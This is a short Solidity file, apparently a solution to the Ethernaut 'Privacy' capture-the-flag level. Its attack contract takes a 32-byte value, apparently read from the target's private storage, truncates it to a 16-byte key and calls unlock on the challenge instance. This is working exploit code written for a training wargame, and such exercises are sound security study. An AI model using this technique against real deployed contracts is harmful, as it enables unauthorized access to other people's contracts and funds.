// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.3;

// Donnie Misino, 2022
// Ethernaught 12: Privacy
// https://ethernaut.openzeppelin.com/level/0x11343d543778213221516D004ED82C45C3c8788B

contract Privacy_Hack {
  address privacyInstance;

  constructor(address _privacyInstance) {
    privacyInstance = _privacyInstance;
  }

  function unlock(bytes32 data) public {
    bytes16 key = bytes16(data);

    IPrivacy c = IPrivacy(privacyInstance);
    c.unlock(key);
  }
}

interface IPrivacy {
  function unlock(bytes16) external;
}